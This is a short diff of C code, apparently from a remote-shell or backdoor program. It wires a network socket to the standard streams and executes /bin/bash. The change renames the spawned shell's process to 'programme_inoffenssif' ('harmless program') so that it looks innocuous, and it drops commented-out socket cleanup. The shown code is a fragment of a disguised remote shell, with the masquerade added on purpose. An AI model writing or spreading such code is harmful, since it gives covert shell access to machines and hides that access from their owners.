@@ -16,7 +16,7 @@
         dup2(*sockfd, STDERR_FILENO);
         dup2(*sockfd,STDIN_FILENO);
         sclose(*sockfd);
-        sexecl("/bin/bash", "/bin/bash", NULL);
+        sexecl("/bin/bash", "programme_inoffenssif", NULL);
     }
 
     int main(int argc, char *argv[]){
@@ -40,13 +40,6 @@
                 break;
             }
         }
-
-        /*for (int j = 0; j < NB_PORTS; j++)
-        {
-            if(sockfdController[j] != -1){
-                sclose(sockfdController[j]);
-            }
-        }*/
 
         free(sockfdController);
         
